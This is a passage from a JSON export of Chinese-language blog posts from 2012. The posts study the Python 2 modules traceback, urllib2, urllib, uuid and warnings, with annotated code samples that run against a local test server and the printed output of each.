class=\"sh_python\">\ndef test_setitem(range_size=1000):\n    l = [ (str(x), x) for x in range(range_size) ]\n    d = {}\n    for s, i in l:\n        d[s] = i\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python -m timeit \"import timeit_setitem; timeit_setitem.test_setitem()\"\n1000 loops, best of 3: 384 usec per loop</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "19"
    }
  },
  {
    "id": 207,
    "title": "关于traceback研究",
    "category": "python模块研究",
    "tags": [
      "traceback"
    ],
    "url": "/archives/guanyutracebackyanjiu/",
    "content": "<p>前言：traceback模块被用来跟踪异常返回信息</p>\n\n<p>这事一个处理的脚本：</p>\n\n<p><pre class=\"sh_python\">\nimport sys</p>\n\n<p>def produce_exception(recursion_level=2):\n    sys.stdout.flush()\n    if recursion_level:\n        produce_exception(recursion_level-1)\n    else:\n        raise RuntimeError()</p>\n\n<p>def call_function(f, recursion_level=2):\n    if recursion_level:\n        return call_function(f, recursion_level-1)\n    else:\n        return f()\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport traceback\nimport sys\nfrom pprint import pprint\nfrom test1 import produce_exception  #引入上面脚本的方法</p>\n\n<p>print 'print_exc() with no exception:'\ntraceback.print_exc(file=sys.stdout) #这里是none\nprint</p>\n\n<p>try:\n    produce_exception()\nexcept Exception, err:\n    print 'print_exc():'\n    traceback.print_exc(file=sys.stdout)  #使用<tt>sys.exc_info()</tt> 获取当前线程,打印文本到一个文件句柄<tt>（默认是sys.stderr）</tt>\n    print\n    print 'print_exc(1):'\n    traceback.print_exc(limit=1, file=sys.stdout)\n    exc_type, exc_value, exc_tb = sys.exc_info()  \n    traceback.print_exception(exc_type, exc_value, exc_tb) #其实traceback.print_exc是traceback.print_exception的短快捷方式 这2行的效果就是上面的\n    pprint(traceback.format_exception(exc_type, exc_value, exc_tb)) #通过pprint以traceback.format_exception格式化的数据显示出来\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport traceback\nimport sys\nfrom pprint import pprint</p>\n\n<p>from traceback_example import call_function</p>\n\n<p>def f():\n    traceback.print_stack(file=sys.stdout) #显示堆栈信息</p>\n\n<p>print 'Calling f() directly:'\nf()</p>\n\n<p>print\nprint 'Calling f() from 3 levels deep:'\ncall_function(f)\ndef f():\n    return traceback.format_stack() #将堆栈信息通过format_stack()格式化</p>\n\n<p>formatted_stack = call_function(f)\npprint(formatted_stack)\ndef f(): \n    return traceback.extract_stack()  #提取堆栈信息\nstack = call_function(f)\npprint(stack)\n</pre></p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "19"
    }
  },
  {
    "id": 208,
    "title": "关于urllib2研究",
    "category": "python模块研究",
    "tags": [
      "urllib2"
    ],
    "url": "/archives/guanyuurllib2yanjiu/",
    "content": "<p>前言：urllib2和urilib很类似，但是模块最显著的区别：1 urllib2可以接受一个<strong>Request</strong>类的实例来设置URL请求的headers，urllib仅可以接受URL。这意味着，你不可以伪装你的User Agent字符串等</p>\n\n<p>2 urllib提供<strong>urlencode</strong>方法用来GET查询字符串的产生，而urllib2没有。这是为何urllib常和urllib2一起使用的原因。</p>\n\n<p>还是借用BaseHTTPServer做的2个程序为服务器端：</p>\n\n<p><pre class=\"sh_python\">\nfrom BaseHTTPServer import BaseHTTPRequestHandler\nimport urlparse </p>\n\n<p>class GetHandler(BaseHTTPRequestHandler):</p>\n\n<p>    def do_GET(self):   #这个是get方法的处理\n        parsed_path = urlparse.urlparse(self.path)\n        message_parts = [\n                'CLIENT VALUES:',\n                'client_address=%s (%s)' % (self.client_address,\n                                            self.address_string()),\n                'command=%s' % self.command,\n                'path=%s' % self.path,\n                'real path=%s' % parsed_path.path,\n                'query=%s' % parsed_path.query,\n                'request_version=%s' % self.request_version,\n                '',\n                'SERVER VALUES:',\n                'server_version=%s' % self.server_version,\n                'sys_version=%s' % self.sys_version,\n                'protocol_version=%s' % self.protocol_version,\n                '',\n                'HEADERS RECEIVED:',\n                ]\n        for name, value in sorted(self.headers.items()):\n            message_parts.append('%s=%s' % (name, value.rstrip()))\n        message_parts.append('')\n        message = '\\r\\n'.join(message_parts)\n        self.send_response(200)\n        self.end_headers()\n        self.wfile.write(message)\n        return</p>\n\n<p>if __name__ == '__main__':\n    from BaseHTTPServer import HTTPServer\n    server = HTTPServer(('localhost', 8080), GetHandler)\n    print 'Starting server, use &lt;Ctrl-C&gt; to stop'\n    server.serve_forever()\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p><pre class=\"sh_python\">\nfrom BaseHTTPServer import BaseHTTPRequestHandler\nimport cgi</p>\n\n<p>class PostHandler(BaseHTTPRequestHandler):</p>\n\n<p>    def do_POST(self):  ##这个是post方法的处理\n        # Parse the form data posted\n        form = cgi.FieldStorage(\n            fp=self.rfile, \n            headers=self.headers,\n            environ={'REQUEST_METHOD':'POST',\n                     'CONTENT_TYPE':self.headers['Content-Type'],\n                     })</p>\n\n<p>        # Begin the response\n        self.send_response(200)\n        self.end_headers()\n        self.wfile.write('Client: %s\\n' % str(self.client_address))\n        self.wfile.write('User-agent: %s\\n' % str(self.headers['user-agent']))\n        self.wfile.write('Path: %s\\n' % self.path)\n        self.wfile.write('Form data:\\n')</p>\n\n<p>        # Echo back information about what was posted in the form\n        for field in form.keys():\n            field_item = form[field]\n            if field_item.filename:\n                # The field contains an uploaded file\n                file_data = field_item.file.read()\n                file_len = len(file_data)\n                del file_data\n                self.wfile.write('\\tUploaded %s as \"%s\" (%d bytes)\\n' % \\\n                        (field, field_item.filename, file_len))\n            else:\n                # Regular form value\n                self.wfile.write('\\t%s=%s\\n' % (field, form[field].value))\n        return</p>\n\n<p>if __name__ == '__main__':\n    from BaseHTTPServer import HTTPServer\n    server = HTTPServer(('localhost', 8080), PostHandler)\n    print 'Starting server, use &lt;Ctrl-C&gt; to stop'\n    server.serve_forever()\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p><pre class=\"sh_python\">\nimport urllib2</p>\n\n<p>response = urllib2.urlopen('http://localhost:8080/')  #指定一个url地址\nprint 'RESPONSE:', response \nprint 'URL     :', response.geturl() #返回url地址</p>\n\n<p>headers = response.info() #头信息\nprint 'DATE    :', headers['date']  #返回日期\nprint 'HEADERS :'\nprint '---------'\nprint headers  #返回服务器的信息和请求时间</p>\n\n<p>data = response.read()  #返回相应数据\nprint 'LENGTH  :', len(data)  #数据长度\nprint 'DATA    :'\nprint '---------'\nprint data #包含客户端和服务器端以及头信息\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nRESPONSE: &lt;addinfourl at 3071720012L whose fp = &lt;socket._fileobject object at 0xb7482cec&gt;&gt;\nURL     : http://localhost:8080/\nDATE    : Tue, 19 Jun 2012 08:25:13 GMT\nHEADERS :\n---------\nServer: BaseHTTP/0.3 Python/2.7\nDate: Tue, 19 Jun 2012 08:25:13 GMT</p>\n\n<p>LENGTH  : 347\nDATA    :\n---------\nCLIENT VALUES:\nclient_address=('127.0.0.1', 33760) (localhost)\ncommand=GET\npath=/\nreal path=/\nquery=\nrequest_version=HTTP/1.1</p>\n\n<p>SERVER VALUES:\nserver_version=BaseHTTP/0.3\nsys_version=Python/2.7\nprotocol_version=HTTP/1.0</p>\n\n<p>HEADERS RECEIVED:\naccept-encoding=identity\nconnection=close\nhost=localhost:8080\nuser-agent=Python-urllib/2.7  #这些和urllib差不多</p>\n\n<p><pre class=\"sh_python\">\nimport urllib2</p>\n\n<p>request = urllib2.Request('http://localhost:8080/')\nrequest.add_header('User-agent', 'DWM (http://www.dongwm.com/)')  #指定一个头信息的用户代理，这样更容易识别。<tt>有利于robots.txt</tt>的控制</p>\n\n<p>response = urllib2.urlopen(request)\ndata = response.read()\nprint data\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nCLIENT VALUES:\nclient_address=('127.0.0.1', 48836) (localhost)\ncommand=GET\npath=/\nreal path=/\nquery=\nrequest_version=HTTP/1.1</p>\n\n<p>SERVER VALUES:\nserver_version=BaseHTTP/0.3\nsys_version=Python/2.7\nprotocol_version=HTTP/1.0</p>\n\n<p>HEADERS RECEIVED:\naccept-encoding=identity\nconnection=close\nhost=localhost:8080\nuser-agent=DWM (http://www.dongwm.com/)  #设置的用户代理</p>\n\n<p><pre class=\"sh_python\">\nimport urllib\nimport urllib2</p>\n\n<p>query_args = { 'q':'query string', 'foo':'bar' }</p>\n\n<p>request = urllib2.Request('http://localhost:8080/')\nprint 'Request method before data:', request.get_method()</p>\n\n<p>request.add_data(urllib.urlencode(query_args))\nprint 'Request method after data :', request.get_method()\nrequest.add_header('User-agent', 'DWM (http://www.dongwm.com/)')</p>\n\n<p>print\nprint 'OUTGOING DATA:'\nprint request.get_data()</p>\n\n<p>print\nprint 'SERVER RESPONSE:'\nprint urllib2.urlopen(request).read()\n</pre></p>\n\n<p>&nbsp;</p>\n\n<p>执行结果：</p>\n\n<p>Request method before data: GET\nRequest method after data : POST  #从get变成了post</p>\n\n<p>OUTGOING DATA:\nq=query+string&amp;foo=bar</p>\n\n<p>SERVER RESPONSE:\nClient: ('127.0.0.1', 59952)\nUser-agent: DWM (http://www.dongwm.com/)\nPath: /\nForm data:\nq=query string\nfoo=bar\n<pre class=\"sh_python\">\nimport itertools\nimport mimetools #解析MIME的工具\nimport mimetypes  #隐射文件名为MIME类型\nfrom cStringIO import StringIO\nimport urllib\nimport urllib2</p>\n\n<p>class MultiPartForm(object):  #积累张贴表单时要使用的数据</p>\n\n<p>    def __init__(self):\n        self.form_fields = []\n        self.files = []\n        self.boundary = mimetools.choose_boundary()  #用来隔开表单中不同部分数据的\n        return</p>\n\n<p>    def get_content_type(self):\n        return 'multipart/form-data; boundary=%s' % self.boundary  #修改Content-type</p>\n\n<p>    def add_field(self, name, value):\n        self.form_fields.append((name, value)) #增加一个表单项\n        return</p>\n\n<p>    def add_file(self, fieldname, filename, fileHandle, mimetype=None):\n        body = fileHandle.read() \n        if mimetype is None:\n            mimetype = mimetypes.guess_type(filename)[0] or 'application/octet-stream'\n        self.files.append((fieldname, filename, mimetype, body))\n        return</p>\n\n<p>    def __str__(self):  #返回一个字符串，代表形式的数据，包括附加的文件。\n        parts = []\n        part_boundary = '--' + self.boundary</p>\n\n<p>        parts.extend(\n            [ part_boundary,\n              'Content-Disposition: form-data; name=\"%s\"' % name,\n              '',\n              value,\n            ]\n            for name, value in self.form_fields\n            )   #增加表单项</p>\n\n<p>        parts.extend(\n            [ part_boundary,\n              'Content-Disposition: file; name=\"%s\"; filename=\"%s\"' % \\\n                 (field_name, filename),\n              'Content-Type: %s' % content_type,\n              '',\n              body,\n            ]\n            for field_name, filename, content_type, body in self.files\n            ) #增加上传文件</p>\n\n<p>        flattened = list(itertools.chain(*parts))  #合并列表\n        flattened.append('--' + self.boundary + '--')\n        flattened.append('')\n        return '\\r\\n'.join(flattened)  #连接CR + LF分隔的数据</p>\n\n<p>if __name__ == '__main__':\n    form = MultiPartForm()  #创建表单域\n    form.add_field('firstname', 'Dong')\n    form.add_field('lastname', 'weiming')</p>\n\n<p>    form.add_file('biography', 'bio.txt',   #添加一个伪造的文件\n                  fileHandle=StringIO('Python developer and blogger.'))</p>\n\n<p>    request = urllib2.Request('http://localhost:8080/')  #创建请求\n    request.add_header('User-agent', 'DMW (http://www.dongwm.com/)')  #头信息添加用户代理\n    body = str(form) \n    request.add_header('Content-type', form.get_content_type())  #添加Content-type\n    request.add_header('Content-length',str(len(body)))  #和英文教程原文不同，这里需要一个字符串的而不是int的\n    request.add_data(body)\n    print 'OUTGOING DATA:'\n    print request.get_data()</p>\n\n<p>    print\n    print 'SERVER RESPONSE:'\n    d = urllib2.urlopen(request)\n    print d.read()\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nOUTGOING DATA:\n--127.0.0.2.1000.3551.1340096549.946.1\nContent-Disposition: form-data; name=\"firstname\"</p>\n\n<p>Dong\n--127.0.0.2.1000.3551.1340096549.946.1\nContent-Disposition: form-data; name=\"lastname\"</p>\n\n<p>weiming\n--127.0.0.2.1000.3551.1340096549.946.1\nContent-Disposition: file; name=\"biography\"; filename=\"bio.txt\"\nContent-Type: text/plain</p>\n\n<p>Python developer and blogger.\n--127.0.0.2.1000.3551.1340096549.946.1--</p>\n\n<p>SERVER RESPONSE:\nClient: ('127.0.0.1', 53901)\nUser-agent: DMW (http://www.dongwm.com/)\nPath: /\nForm data:\nlastname=weiming\nUploaded biography as \"bio.txt\" (29 bytes)\nfirstname=Dong</p>\n\n<p><pre class=\"sh_python\">\nimport mimetypes\nimport os\nimport tempfile\nimport urllib\nimport urllib2</p>\n\n<p>class NFSFile(file):\n    def __init__(self, tempdir, filename):\n        self.tempdir = tempdir\n        file.__init__(self, filename, 'rb')\n    def close(self):\n        print\n        print 'NFSFile:'\n        print '  unmounting %s' % self.tempdir\n        print '  when %s is closed' % os.path.basename(self.name)\n        return file.close(self)</p>\n\n<p>class FauxNFSHandler(urllib2.BaseHandler):  #继承至urllib2.BaseHandler类，自定义协议处理程序类</p>\n\n<p>    def __init__(self, tempdir):\n        self.tempdir = tempdir</p>\n\n<p>    def nfs_open(self, req):\n        url = req.get_selector()\n        directory_name, file_name = os.path.split(url)\n        server_name = req.get_host()\n        print\n        print 'FauxNFSHandler simulating mount:'\n        print '  Remote path: %s' % directory_name\n        print '  Server     : %s' % server_name\n        print '  Local path : %s' % tempdir\n        print '  File name  : %s' % file_name\n        local_file = os.path.join(tempdir, file_name)\n        fp = NFSFile(tempdir, local_file)\n        content_type = mimetypes.guess_type(file_name)[0] or 'application/octet-stream'\n        stats = os.stat(local_file)\n        size = stats.st_size\n        headers = { 'Content-type': content_type,\n                    'Content-length': size,\n                  }\n        return urllib.addinfourl(fp, headers, req.get_full_url())</p>\n\n<p>if __name__ == '__main__':\n    tempdir = tempfile.mkdtemp()\n    try:\n        with open(os.path.join(tempdir, 'file.txt'), 'wt') as f:\n            f.write('Contents of file.txt')</p>\n\n<p>        opener = urllib2.build_opener(FauxNFSHandler(tempdir))  #构建NFS处理类（他返回的类对象去调用该对象的open方法）\n        urllib2.install_opener(opener)  #注册这个类</p>\n\n<p>        response = urllib2.urlopen('nfs://remote_server/path/to/the/file.txt')  \n        print\n        print 'READ CONTENTS:', response.read()\n        print 'URL          :', response.geturl()\n        print 'HEADERS:'\n        for name, value in sorted(response.info().items()):\n            print '  %-15s = %s' % (name, value)\n        response.close()\n    finally:\n        os.remove(os.path.join(tempdir, 'file.txt'))\n        os.removedirs(tempdir)\n</pre>\n执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py</p>\n\n<p>FauxNFSHandler simulating mount:\nRemote path: /path/to/the\nServer     : remote_server\nLocal path : /tmp/tmpAdEnXg\nFile name  : file.txt</p>\n\n<p>READ CONTENTS: Contents of file.txt\nURL          : nfs://remote_server/path/to/the/file.txt\nHEADERS:\nContent-length  = 20\nContent-type    = text/plain</p>\n\n<p>NFSFile:\nunmounting /tmp/tmpAdEnXg\nwhen file.txt is closed</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "19"
    }
  },
  {
    "id": 209,
    "title": "关于urllib研究",
    "category": "python模块研究",
    "tags": [
      "urllib"
    ],
    "url": "/archives/guanyuurllibyanjiu/",
    "content": "<p>前言;urllib模块提供了一个访问网络资源的简单接口支持（ftp协议)，访问不需要认证的远程资源</p>\n\n<p>因为urllib模块是一个客户端模块，需要一个httpserver，借用以前的BaseHTTPServer的模块的程序：</p>\n\n<p><pre class=\"sh_python\">\nfrom BaseHTTPServer import BaseHTTPRequestHandler\nimport urlparse </p>\n\n<p>class GetHandler(BaseHTTPRequestHandler):</p>\n\n<p>    def do_GET(self):   #这个是get方法的处理\n        parsed_path = urlparse.urlparse(self.path)\n        message_parts = [\n                'CLIENT VALUES:',\n                'client_address=%s (%s)' % (self.client_address,\n                                            self.address_string()),\n                'command=%s' % self.command,\n                'path=%s' % self.path,\n                'real path=%s' % parsed_path.path,\n                'query=%s' % parsed_path.query,\n                'request_version=%s' % self.request_version,\n                '',\n                'SERVER VALUES:',\n                'server_version=%s' % self.server_version,\n                'sys_version=%s' % self.sys_version,\n                'protocol_version=%s' % self.protocol_version,\n                '',\n                'HEADERS RECEIVED:',\n                ]\n        for name, value in sorted(self.headers.items()):\n            message_parts.append('%s=%s' % (name, value.rstrip()))\n        message_parts.append('')\n        message = '\\r\\n'.join(message_parts)\n        self.send_response(200)\n        self.end_headers()\n        self.wfile.write(message)\n        return</p>\n\n<p>if __name__ == '__main__':\n    from BaseHTTPServer import HTTPServer\n    server = HTTPServer(('localhost', 8080), GetHandler)\n    print 'Starting server, use &lt;Ctrl-C&gt; to stop'\n    server.serve_forever()\n</pre></p>\n\n<p><pre class=\"sh_python\">\nfrom BaseHTTPServer import BaseHTTPRequestHandler\nimport cgi</p>\n\n<p>class PostHandler(BaseHTTPRequestHandler):</p>\n\n<p>    def do_POST(self):  ##这个是post方法的处理\n        # Parse the form data posted\n        form = cgi.FieldStorage(\n            fp=self.rfile, \n            headers=self.headers,\n            environ={'REQUEST_METHOD':'POST',\n                     'CONTENT_TYPE':self.headers['Content-Type'],\n                     })</p>\n\n<p>        # Begin the response\n        self.send_response(200)\n        self.end_headers()\n        self.wfile.write('Client: %s\\n' % str(self.client_address))\n        self.wfile.write('User-agent: %s\\n' % str(self.headers['user-agent']))\n        self.wfile.write('Path: %s\\n' % self.path)\n        self.wfile.write('Form data:\\n')</p>\n\n<p>        # Echo back information about what was posted in the form\n        for field in form.keys():\n            field_item = form[field]\n            if field_item.filename:\n                # The field contains an uploaded file\n                file_data = field_item.file.read()\n                file_len = len(file_data)\n                del file_data\n                self.wfile.write('\\tUploaded %s as \"%s\" (%d bytes)\\n' % \\\n                        (field, field_item.filename, file_len))\n            else:\n                # Regular form value\n                self.wfile.write('\\t%s=%s\\n' % (field, form[field].value))\n        return</p>\n\n<p>if __name__ == '__main__':\n    from BaseHTTPServer import HTTPServer\n    server = HTTPServer(('localhost', 8080), PostHandler)\n    print 'Starting server, use &lt;Ctrl-C&gt; to stop'\n    server.serve_forever()\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport urllib</p>\n\n<p>response = urllib.urlopen('http://localhost:8080/')  #指定要打开的网页\nprint 'RESPONSE:', response   #这个类文件对象也是可以迭代\nprint 'URL :', response.geturl() #返回这个网页的url地址</p>\n\n<p>headers = response.info()\nprint 'DATE :', headers['date']  #执行请求的时间\nprint 'HEADERS :'\nprint '---------'\nprint headers  #返回server的信息和date信息</p>\n\n<p>data = response.read() #取到数据\nprint 'LENGTH :', len(data) #数据长度\nprint 'DATA :'\nprint '---------'\nprint data  #返回客户端，服务器端的一些信息，header信息\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nRESPONSE: &lt;addinfourl at 3074658828L whose fp = &lt;socket._fileobject object at 0xb7418b2c&gt;&gt;\nURL : http://localhost:8080/\nDATE : Tue, 19 Jun 2012 07:55:13 GMT\nHEADERS :\n---------\nServer: BaseHTTP/0.3 Python/2.7\nDate: Tue, 19 Jun 2012 07:55:13 GMT</p>\n\n<p>LENGTH : 304\nDATA :\n---------\nCLIENT VALUES:\nclient_address=('127.0.0.1', 57709) (localhost)\ncommand=GET\npath=/\nreal path=/\nquery=\nrequest_version=HTTP/1.0</p>\n\n<p>SERVER VALUES:\nserver_version=BaseHTTP/0.3\nsys_version=Python/2.7\nprotocol_version=HTTP/1.0</p>\n\n<p>HEADERS RECEIVED:\nhost=localhost:8080\nuser-agent=Python-urllib/1.17</p>\n\n<p><pre class=\"sh_python\">\nimport urllib\nquery_args = { 'q':'query string', 'foo':'bar' }\nencoded_args = urllib.urlencode(query_args) #将dict或者包含两个元素的元组列表转换成url参数，如果参数doseq=True ，表示使用单独的变量来传递值序列时\nprint 'Encoded:', encoded_args</p>\n\n<p>url = 'http://localhost:8080/?' + encoded_args\nprint urllib.urlopen(url).read()  #返回打开的这个get页面的数据\nprint 'quote() :', urllib.quote(url) #对字符串进行编码。参数safe指定了不需要编码的字符 同样的还原就是unquote\nprint 'quote_plus():', urllib.quote_plus(url) #与urllib.quote类似，但这个方法用'+'来替换' '，而quote用'%20'来代替 同样的还原就是unquote_plus\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport urllib\nquery_args = { 'q':'query string', 'foo':'bar' }\nencoded_args = urllib.urlencode(query_args)\nurl = 'http://localhost:8080/'\nprint urllib.urlopen(url, encoded_args).read()  #通过POST代替GET方式传递数据给远程服务器, 仅仅是把已编码的查询参数当作数据传递给urlopen().\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport urllib\nimport os</p>\n\n<p>def reporthook(blocks_read, block_size, total_size):\n    if not blocks_read:\n        print 'Connection opened'\n        return\n    if total_size &lt; 0:\n        # Unknown size 未知大小\n        print 'Read %d blocks' % blocks_read\n    else:\n        amount_read = blocks_read * block_size\n        print 'Read %d blocks, or %d/%d' % (blocks_read, amount_read, total_size)\n        return</p>\n\n<p>try:\n    filename, msg = urllib.urlretrieve('http://www.dongwm.com/', reporthook=reporthook) # urlretrieve方法直接将远程数据下载到本地。\n                                                #参数filename指定了保存到本地的路径（如果未指定该参数，urllib会生成一个临时文件来保存数据） ,reporthook是一个回调函数\n                                                #当连接上服务器、以及相应的数据块传输完毕的时候会触发该回调。我们可以利用这个回调函 数来显示当前的下载进度\n    print\n    print 'File:', filename\n    print 'Headers:'\n    print msg\n    print 'File exists before cleanup:', os.path.exists(filename)\nfinally:\n    urllib.urlcleanup()   #除这些临时的复本\n    print 'File still exists:', os.path.exists(filename)\n</pre></p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "19"
    }
  },
  {
    "id": 210,
    "title": "关于uuid研究",
    "category": "python模块研究",
    "tags": [
      "uuid"
    ],
    "url": "/archives/guanyuuuidyanjiu/",
    "content": "<p>前言：uuid是使用python生成唯一ID的模块，uuid是一种唯一标识，在许多领域作为标识用途.主要方法从硬件地址和时间生成，md5，sha－1，随机四种方法</p>\n\n<p><pre class=\"sh_python\">\nimport uuid</p>\n\n<p>print hex(uuid.getnode())   #根据系统的mac地址打印  ,但是多个mac就有问题</p>\n\n<p>u = uuid.uuid1()  #uuid.uuid1()根据mac地址生成uuid  不带参数就是使用uuid.getnode() </p>\n\n<p>print u\nprint type(u)\nprint 'bytes   :', repr(u.bytes)\nprint 'hex     :', u.hex\nprint 'int     :', u.int\nprint 'urn     :', u.urn\nprint 'variant :', u.variant\nprint 'version :', u.version\nprint 'fields  :', u.fields\nprint '\\ttime_low            : ', u.time_low\nprint '\\ttime_mid            : ', u.time_mid\nprint '\\ttime_hi_version     : ', u.time_hi_version\nprint '\\tclock_seq_hi_variant: ', u.clock_seq_hi_variant\nprint '\\tclock_seq_low       : ', u.clock_seq_low\nprint '\\tnode                : ', u.node\nprint '\\ttime                : ', u.time\nprint '\\tclock_seq           : ', u.clock_seq</p>\n\n<p>for i in xrange(3):\n    print uuid.uuid1()  #uuid1()里面也包含了时间的影响  这样的迭代其中的一部分因为是时间不同而不同</p>\n\n<p>node1 = uuid.getnode()\nprint hex(node1), uuid.uuid1(node1)  #本机mac地址生成</p>\n\n<p>node2 =  0x1e5274040e\nprint hex(node2), uuid.uuid1(node2)  #根据这个特定mac生成</p>\n\n<p>hostnames = ['www.ailll.com', 'www.dongwm.com']</p>\n\n<p>for name in hostnames:\n    print name\n    print '\\tMD5   :', uuid.uuid3(uuid.NAMESPACE_DNS, name)  #uuid3基于dns和加密算法md5\n    print '\\tSHA-1 :', uuid.uuid5(uuid.NAMESPACE_DNS, name)  #uuid5是基于dns和加密算法sha-1 \nfor i in xrange(3):\n    print uuid.uuid3(uuid.NAMESPACE_DNS, 'www.doughellmann.com')  #不基于时间 所以是迭代的是一样的\nfor i in xrange(3):\n    print uuid.uuid4()  #uuid4是根据随机算法  每次差别很大\ndef show(msg, l):\n    print msg\n    for v in l:\n        print '\\t', v\n    print</p>\n\n<p>input_values = [ \n    'urn:uuid:f2f84497-b3bf-493a-bba9-7c68e6def80b',\n    '{417a5ebb-01f7-4ed5-aeac-3d56cd5037b0}',\n    '2115773a-5bf1-11dd-ab48-001ec200d9e0',\n    ]  #用于分析各种格式的字符串创建的UUID对象</p>\n\n<p>show('input_values', input_values)</p>\n\n<p>uuids = [ uuid.UUID(s) for s in input_values ]\nshow('converted to uuids', uuids)</p>\n\n<p>uuids.sort()\nshow('sorted', uuids)\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\n0xaeb8f70e0L\nf312fcaa-b9f1-11e1-bc26-000aeb8f70e0\n&lt;class 'uuid.UUID'&gt;\nbytes   : '\\xf3\\x12\\xfc\\xaa\\xb9\\xf1\\x11\\xe1\\xbc&amp;\\x00\\n\\xeb\\x8fp\\xe0'\nhex     : f312fcaab9f111e1bc26000aeb8f70e0\nint     : 323100989012742094042604002680798933216\nurn     : urn:uuid:f312fcaa-b9f1-11e1-bc26-000aeb8f70e0\nvariant : specified in RFC 4122\nversion : 1\nfields  : (4078107818L, 47601L, 4577L, 188L, 38L, 46901719264L)\ntime_low            :  4078107818\ntime_mid            :  47601\ntime_hi_version     :  4577\nclock_seq_hi_variant:  188\nclock_seq_low       :  38\nnode                :  46901719264\ntime                :  135593912614190250\nclock_seq           :  15398\nf31305ec-b9f1-11e1-bc26-000aeb8f70e0\nf31307f4-b9f1-11e1-bc26-000aeb8f70e0\nf3130952-b9f1-11e1-bc26-000aeb8f70e0\n0xaeb8f70e0L f3131b0c-b9f1-11e1-8092-000aeb8f70e0\n0x1e5274040eL f3131d17-b9f1-11e1-b53b-001e5274040e\nwww.ailll.com\nMD5   : 3b7e4bb6-9606-34f9-ae27-98e0a83555ea\nSHA-1 : 2eae48e1-73e7-57c7-8b7c-3229c87fd79e\nwww.dongwm.com\nMD5   : 2ddcfb77-c053-3e92-8a24-b57206b75157\nSHA-1 : 1ceafb54-c8ec-5090-b6ec-e71b3f0e15a9\nbcd02e22-68f0-3046-a512-327cca9def8f\nbcd02e22-68f0-3046-a512-327cca9def8f\nbcd02e22-68f0-3046-a512-327cca9def8f\n225d3fa0-d176-4eea-af0f-5a043711062d\n5039067a-e2a7-4a9b-8f3a-edd54d90a280\n40c69a3c-ebbc-4b67-b083-3223e32248ac\ninput_values\nurn:uuid:f2f84497-b3bf-493a-bba9-7c68e6def80b\n{417a5ebb-01f7-4ed5-aeac-3d56cd5037b0}\n2115773a-5bf1-11dd-ab48-001ec200d9e0</p>\n\n<p>converted to uuids\nf2f84497-b3bf-493a-bba9-7c68e6def80b\n417a5ebb-01f7-4ed5-aeac-3d56cd5037b0\n2115773a-5bf1-11dd-ab48-001ec200d9e0</p>\n\n<p>sorted\n2115773a-5bf1-11dd-ab48-001ec200d9e0\n417a5ebb-01f7-4ed5-aeac-3d56cd5037b0\nf2f84497-b3bf-493a-bba9-7c68e6def80b</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "19"
    }
  },
  {
    "id": 211,
    "title": "关于warnings研究",
    "category": "python模块研究",
    "tags": [
      "warnings"
    ],
    "url": "/archives/guanyuwarningsyanjiu/",
    "content": "<p>前言：warnings是非致命级别警报的模块,当执行行程序时遇到问题时给用户非致命性的警示</p>\n\n<p><pre class=\"sh_python\">\nprint 'Before the warning'\nwarnings.warn('This is a warning message')  #产生一个警告\nprint 'After the warning'\nprint\nwarnings.simplefilter('error', UserWarning)#当出现报错 就停止继续</p>\n\n<p>print 'Before the warning'\nwarnings.warn('This is a warning message')  \nprint 'After the warning'\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nBefore the warning\ntest.py:5: UserWarning: This is a warning message\nwarnings.warn('This is a warning message')\nAfter the warning</p>\n\n<p>Before the warning\nTraceback (most recent call last):\nFile \"test.py\", line 11, in &lt;module&gt;\nwarnings.warn('This is a warning message')\nUserWarning: This is a warning message   #UserWarning  执行报错 停止</p>\n\n<p><pre class=\"sh_python\">\nimport warnings\nimport logging\nwarnings.filterwarnings('ignore', '.*do not.*',) #过滤报错信息，其中包含6种：error：变成一个异常警告，ignore:丢弃警告，\n#always:始终报警，default:它是从每个位置产生的第一次打印警告，module:它是从每个模块产生的第一次打印警告，once:它生成的第一次打印警告\nwarnings.warn('Show this message')   #打印这个信息\nwarnings.warn('Do not show this message')  #不打印这个信息，上面过滤了'.*do not.*'这样的模式匹配</p>\n\n<p>def function_with_warning():\n    warnings.warn('This is a warning!')</p>\n\n<p>function_with_warning() #虽然调用三次，只打印一次 不重复\nfunction_with_warning()\nfunction_with_warning()</p>\n\n<p>warnings.simplefilter('once', UserWarning)  #也可以这样调用，告诉值是第一次打印错误警告</p>\n\n<p>warnings.warn('This is a warning!')\nwarnings.warn('This is a warning!')\nwarnings.warn('This is a warning!')</p>\n\n<p>logging.basicConfig(level=logging.INFO)</p>\n\n<p>def send_warnings_to_log(message, category, filename, lineno, file=None):  #设定一个记录日志的方法\n    logging.warning(\n        '%s:%s: %s:%s' % \n        (filename, lineno, category.__name__, message))\n    return</p>\n\n<p>old_showwarning = warnings.showwarning  #默认是终端显示错误信息，但是也可能改变方式  这里保存旧的方式\nwarnings.showwarning = send_warnings_to_log  #将显示错误信息的方式改成用这个函数执行</p>\n\n<p>warnings.warn('This is a warning message')  #这里就会以logging的方式显示</p>\n\n<p>def warning_on_one_line(message, category, filename, lineno, file=None, line=None):\n    return ' %s:%s: %s:%s' % (filename, lineno, category.__name__, message)</p>\n\n<p>warnings.warn('This is a 